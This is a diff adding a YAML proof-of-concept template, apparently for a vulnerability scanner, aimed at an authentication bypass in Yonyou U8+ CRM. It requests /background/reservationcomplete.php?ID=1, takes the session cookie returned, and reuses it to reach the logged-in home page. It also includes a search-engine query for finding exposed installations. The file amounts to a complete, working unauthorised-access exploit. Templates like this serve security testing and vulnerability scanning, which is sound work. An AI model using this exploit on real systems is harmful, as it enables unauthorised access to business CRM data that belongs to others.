@@ -1,0 +1,21 @@
+id: poc-yaml-yy-U8+CRM-reservationcomplete-php-bypass-authentication-login
+info:
+  name: 用友U8 CRM reservationcomplete.php 绕过验证登录漏洞
+  severity: high
+  tags:
+  - 未授权访问
+  finger: 用友U8+CRM
+  hunter: app.name="用友 CRM"
+requests:
+- method: GET
+  path: /background/reservationcomplete.php?ID=1
+  expression: status_code == 200 && body == "" && matches(headers,"PHPSESSID=(?P<cookie>.*?);")
+  output:
+  - regex_match(headers,"PHPSESSID=(?P<cookie>.*?);")
+- method: GET
+  path: /
+  headers:
+    Cookie: PHPSESSID={{.cookie}}
+  expression: status_code == 200 && contains(body,"\"serverName\"") && contains(body,"登出")
+variables: {}
+transport: http
